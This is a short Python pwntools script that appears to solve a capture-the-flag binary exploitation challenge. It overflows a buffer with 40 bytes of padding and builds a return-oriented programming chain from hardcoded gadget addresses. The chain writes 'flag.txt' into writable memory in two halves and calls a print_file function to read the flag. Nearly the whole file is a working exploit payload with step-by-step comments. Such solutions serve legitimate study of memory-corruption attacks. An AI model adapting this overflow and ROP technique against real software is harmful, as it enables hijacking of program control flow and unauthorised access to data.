import sys
from pwn import *

empty_add = 0x60103e

flag = b'flag.txt'

pop_rdx = 0x40062a # 1 pop after
pop_rbp = 0x400588
rbp_modifier = 0x48
mov_dword_edx = 0x400606 # 1 pop after

pop_rdi = 0x4006a3
print_file = 0x400510


padding = b'a' * 40

# padding to reach the ret address
payload = padding
# pop 'flag' into rdx because mov uses edx (a 32 bit register)
payload += p64(pop_rdx)
payload += p64(u64(b'flagxxxx'))
# junk data to give to the extra pop intruction
payload += p64(u64(b'flagxxxx'))
# pop a writable address into rbp
payload += p64(pop_rbp) 
payload += p64(empty_add - rbp_modifier)
# move 'flag' into the writable address
payload += p64(mov_dword_edx)
payload += p64(empty_add)
# pop '.txt' into rdx, the other half of 'flag.txt' because mov uses edx a 32 bit register
payload += p64(pop_rdx)
payload += p64(u64(b'.txtxxxx'))
# junk data to give to the extra pop intruction
payload += p64(u64(b'.txtxxxx'))
# pop a writable address into rbp
payload += p64(pop_rbp) 
payload += p64(empty_add - rbp_modifier + 0x04)
# move 'flag' into the writable address
payload += p64(mov_dword_edx)
payload += p64(empty_add)

# pop the writable address where 'flag.txt' resides into rdi to use as argument for print_file
payload += p64(pop_rdi)
payload += p64(empty_add)
# call print_file
payload += p64(print_file)
# profit
#payload += p64()



sys.stdout.buffer.write(payload)
